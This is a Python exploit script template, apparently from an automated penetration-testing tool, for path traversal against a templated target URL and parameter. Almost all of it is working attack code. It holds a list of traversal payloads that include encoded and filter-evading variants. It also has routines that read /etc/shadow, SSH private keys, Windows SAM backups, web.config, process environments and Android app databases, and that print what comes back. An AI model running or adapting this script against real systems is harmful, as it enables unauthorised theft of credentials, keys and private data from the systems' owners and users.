#!/usr/bin/env python3
"""
Path Traversal Exploitation
Target: {{ target_url }}
Vulnerable Parameter: {{ parameter }}
"""

import requests
import urllib.parse

# Configuration
BASE_URL = "{{ target_url }}"
VULNERABLE_PARAM = "{{ parameter }}"

# Path traversal payloads
PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "../../../../../../../etc/hosts",
    "../../../../../../../etc/shadow",
    "../../../../../../../proc/self/environ",
    "../../../../../../../proc/version",
    "../../../../../../../var/log/apache2/access.log",
    "../../../../../../../var/log/nginx/access.log",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini"
]

# Sensitive files to test
SENSITIVE_FILES = {
    'linux': [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/group',
        '/proc/self/environ',
        '/proc/version',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/home/user/.ssh/id_rsa',
        '/root/.ssh/id_rsa',
        '/etc/mysql/my.cnf',
        '/etc/nginx/nginx.conf'
    ],
    'windows': [
        'c:/windows/win.ini',
        'c:/windows/system32/drivers/etc/hosts',
        'c:/windows/system.ini',
        'c:/boot.ini',
        'c:/windows/repair/SAM',
        'c:/windows/repair/system',
        'c:/windows/repair/software',
        'c:/windows/repair/security',
        'c:/inetpub/wwwroot/web.config',
        'c:/windows/php.ini'
    ],
    'android': [
        '/data/data/{{ package_name }}/shared_prefs/preferences.xml',
        '/data/data/{{ package_name }}/databases/app.db',
        '/data/data/{{ package_name }}/files/config.json',
        '/system/build.prop',
        '/proc/cpuinfo',
        '/proc/meminfo',
        '/data/local.prop',
        '/default.prop'
    ]
}

def test_payload(url, param, payload):
    """Test a single payload"""
    try:
        # Build URL with payload
        if '?' in url:
            test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
        else:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"

        # Send request
        response = requests.get(test_url, timeout=10)

        # Check for indicators of successful path traversal
        indicators = {
            '/etc/passwd': ['root:', 'daemon:', 'bin:', ':0:0:'],
            'win.ini': ['[fonts]', '[extensions]', '[mci extensions]'],
            '/etc/hosts': ['127.0.0.1', 'localhost', '::1'],
            '/proc/version': ['Linux version', 'gcc version'],
            'web.config': ['<configuration>', '<system.web>', 'connectionString']
        }

        # Check response for indicators
        for file_path, keywords in indicators.items():
            if any(keyword in response.text for keyword in keywords):
                print(f"[+] Successful path traversal with payload: {payload}")
                print(f"[+] Accessed file: {file_path}")
                print(f"[+] Response preview:")
                print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                return True

        # Check for error messages that might indicate the vulnerability
        error_indicators = [
            'No such file or directory',
            'Permission denied',
            'Access is denied',
            'File not found',
            'Invalid file path'
        ]

        if any(error in response.text for error in error_indicators):
            print(f"[*] Path traversal attempted but blocked: {payload}")
            return False

    except Exception as e:
        print(f"[-] Error testing payload {payload}: {e}")

    return False

def exploit():
    """Run path traversal exploitation"""
    print(f"[*] Starting path traversal exploitation")
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Parameter: {VULNERABLE_PARAM}")

    successful_payloads = []

    # Test all payloads
    for payload in PAYLOADS:
        print(f"\n[*] Testing payload: {payload}")
        if test_payload(BASE_URL, VULNERABLE_PARAM, payload):
            successful_payloads.append(payload)

    # If we found working payloads, try to access more files
    if successful_payloads:
        print(f"\n[+] Found {len(successful_payloads)} working payloads")

        # Determine OS type based on successful payloads
        os_type = 'linux'
        if any('win.ini' in p for p in successful_payloads):
            os_type = 'windows'
        elif any('/data/data' in p for p in successful_payloads):
            os_type = 'android'

        print(f"[*] Detected OS type: {os_type}")

        # Try to access sensitive files
        print("\n[*] Attempting to access sensitive files...")
        for file_path in SENSITIVE_FILES.get(os_type, []):
            # Construct payload
            if file_path.startswith('/'):
                # Unix-style path
                payload = '../' * 10 + file_path.lstrip('/')
            else:
                # Windows-style path
                payload = '..\\' * 10 + file_path

            print(f"[*] Trying to access: {file_path}")
            test_payload(BASE_URL, VULNERABLE_PARAM, payload)

    else:
        print("[-] No successful payloads found")

    print("\n[*] Exploitation complete")

if __name__ == "__main__":
    exploit()